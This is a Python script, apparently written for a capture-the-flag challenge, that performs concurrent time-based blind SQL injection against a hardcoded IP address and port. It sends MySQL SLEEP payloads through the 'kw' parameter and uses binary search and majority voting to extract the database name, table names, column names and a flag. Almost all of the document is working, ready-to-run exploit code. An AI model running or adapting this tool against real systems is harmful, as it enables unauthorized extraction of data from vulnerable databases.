#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Time-based blind SQLi extractor — concurrent version (v2)
用法: python3 sqli_concurrent.py

修复：并发高负载下基准延迟升高导致的误判问题。
方案：每次 is_true 同时发一条 false 基准请求，用相对差值判断，
      而不是依赖固定阈值。
"""

import requests
import time
import threading
import statistics
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─── 配置 ────────────────────────────────────────────────────────────────────

URL        = "http://47.120.61.230:33116/"
PARAM      = "kw"

SLEEP_TIME  = 2.0   # 注入延迟（秒）。相对判断模式下可适当调大提高可靠性
TIMEOUT     = 3.0   # 请求超时，必须 > SLEEP_TIME
WORKERS     = 10    # 并发线程数。太高会让基准延迟飙升，10 是个稳妥值
MAX_RETRIES = 3     # 单次请求失败重试次数

# 相对判断：sleep请求耗时 比 false基准耗时 高出这个倍数则判 true
# 2.0 表示"至少要比基准慢 2 倍"，可适当调低到 1.5 提速，调高到 2.5 提精度
RATIO_THRESHOLD = 2.5   # 调高一些，宁可漏判也别误判
VOTE_COUNT      = 3     # 每个条件投票次数，奇数；准确性 vs 速度的权衡

PAYLOAD_SLEEP = "' AND IF(({cond}),SLEEP({sleep}),0)-- -"
PAYLOAD_FALSE = "' AND 1=2-- -"   # 永远 false，用来测基准延迟

# ─── HTTP ─────────────────────────────────────────────────────────────────────

_session_local = threading.local()

def get_session():
    if not hasattr(_session_local, "session"):
        s = requests.Session()
        s.headers.update({"User-Agent": "Mozilla/5.0"})
        _session_local.session = s
    return _session_local.session


def _raw_request(params: dict) -> float:
    """发一条请求，返回耗时。超时返回 TIMEOUT，出错返回 -1。"""
    for attempt in range(MAX_RETRIES):
        try:
            start = time.time()
            get_session().get(URL, params=params, timeout=TIMEOUT)
            return time.time() - start
        except requests.exceptions.Timeout:
            return TIMEOUT
        except Exception as e:
            if attempt == MAX_RETRIES - 1:
                return -1
            time.sleep(0.2)


def _query_once(cond: str) -> bool:
    """单次判断：先测基准延迟，再发 sleep 请求，比较比值。"""
    # 先单独测基准（不受 sleep 请求干扰）
    t_base = _raw_request({PARAM: PAYLOAD_FALSE})
    if t_base <= 0:
        t_base = 0.05

    sleep_payload = PAYLOAD_SLEEP.format(cond=cond, sleep=SLEEP_TIME)
    t_sleep = _raw_request({PARAM: sleep_payload})
    if t_sleep < 0:
        return False

    ratio = t_sleep / t_base
    return ratio >= RATIO_THRESHOLD


def is_true(cond: str, votes: int = VOTE_COUNT) -> bool:
    """
    多数投票：连续发 votes 次独立判断，过半为 true 才返回 True。
    消除单次网络抖动造成的误判/漏判。
    """
    results = [_query_once(cond) for _ in range(votes)]
    return sum(results) > votes / 2

# ─── 工具函数 ─────────────────────────────────────────────────────────────────

def health_check() -> bool:
    try:
        r = requests.get(URL, params={PARAM: "1"}, timeout=5)
        print(f"[*] Health check: status={r.status_code}, len={len(r.text)}")
        samples = [_raw_request({PARAM: PAYLOAD_FALSE}) for _ in range(3)]
        samples = [s for s in samples if s > 0]
        if samples:
            avg = statistics.mean(samples)
            print(f"[*] Baseline latency: {avg*1000:.0f}ms (avg of 3)")
            if avg > 0.5:
                print(f"[!] Warning: high baseline latency ({avg:.2f}s). "
                      "Consider reducing WORKERS or increasing RATIO_THRESHOLD.")
        return r.status_code < 500
    except Exception as e:
        print(f"[-] Health check failed: {e}")
        return False


def test_sqli() -> bool:
    print("[*] Testing time-based SQLi...")
    if is_true("1=1") and not is_true("1=2"):
        print("[+] SQLi confirmed.")
        return True
    print("[-] SQLi not confirmed.")
    return False


def get_length(expr: str, max_len: int = 300) -> int:
    """二分查找长度"""
    low, high = 1, max_len
    while low < high:
        mid = (low + high) // 2
        if is_true(f"LENGTH(({expr}))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low


def get_char(expr: str, pos: int) -> str:
    """二分查找单个字符的 ASCII 值"""
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if is_true(f"ASCII(SUBSTRING(({expr}),{pos},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return chr(low)

# ─── 并发提取 ─────────────────────────────────────────────────────────────────

def dump_expr(expr: str, max_len: int = 300) -> str:
    """
    并发提取字符串：
    1. 先用二分查找长度（单线程，~7 次请求）
    2. 所有字符位置并发跑，互不干扰
    """
    print(f"[*] Getting length of: {expr[:60]}")
    length = get_length(expr, max_len)
    print(f"[+] Length: {length}")
    print(f"[*] Extracting {length} chars with {min(WORKERS, length)} workers...")

    results = {}
    lock = threading.Lock()

    def get_char_at(pos: int):
        ch = get_char(expr, pos)
        with lock:
            results[pos] = ch
            # 实时打印当前进度
            current = "".join(results.get(i, "░") for i in range(1, length + 1))
            done = sum(1 for i in range(1, length + 1) if i in results)
            print(f"\r[+] [{done:3d}/{length}] {current}", end="", flush=True)
        return pos, ch

    with ThreadPoolExecutor(max_workers=min(WORKERS, length)) as executor:
        futures = {executor.submit(get_char_at, pos): pos for pos in range(1, length + 1)}
        for f in as_completed(futures):
            try:
                f.result()
            except Exception as e:
                pos = futures[f]
                print(f"\n[!] Error at pos {pos}: {e}")
                results[pos] = "?"

    print()  # 换行
    return "".join(results.get(i, "?") for i in range(1, length + 1))


def dump_expr_no_length(expr: str, max_len: int = 128) -> str:
    """
    跳过 get_length，直接并发跑到 max_len，遇到 NUL 或 '}' 截断。
    适合 flag 格式已知、想省几秒的场景。
    """
    print(f"[*] Extracting (no length check, max={max_len}) with {WORKERS} workers...")

    results = {}
    lock = threading.Lock()

    def get_char_at(pos: int):
        ch = get_char(expr, pos)
        with lock:
            results[pos] = ch
            done = len(results)
            current = "".join(results.get(i, "░") for i in range(1, max_len + 1))
            print(f"\r[+] [{done:3d}/{max_len}] {current[:80]}", end="", flush=True)
        return pos, ch

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = {executor.submit(get_char_at, pos): pos for pos in range(1, max_len + 1)}
        for f in as_completed(futures):
            try:
                f.result()
            except Exception as e:
                pos = futures[f]
                results[pos] = "?"

    print()
    out = ""
    for i in range(1, max_len + 1):
        ch = results.get(i, "?")
        out += ch
        if ch in ("\x00", "}"):
            break
    return out

# ─── 主流程 ───────────────────────────────────────────────────────────────────

def main():
    t_start = time.time()

    if not health_check():
        return

    if not test_sqli():
        return

    # 1. 当前数据库
    db = dump_expr("DATABASE()", 80)
    print(f"[+] database(): {db}\n")

    # 2. 表名
    tables = dump_expr(
        f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables "
        f"WHERE table_schema='{db}'",
        300,
    )
    print(f"[+] tables: {tables}\n")

    # 3. flag_table 列名
    columns = dump_expr(
        f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns "
        f"WHERE table_schema='{db}' AND table_name='flag_table'",
        300,
    )
    print(f"[+] flag_table columns: {columns}\n")

    # 4. flag（用 no_length 版本，直接跑到 '}' 截止）
    flag = dump_expr_no_length("SELECT flag FROM flag_table LIMIT 1", max_len=80)
    print(f"\n[+] FLAG: {flag}")
    print(f"[*] Total time: {time.time() - t_start:.1f}s")


if __name__ == "__main__":
    main()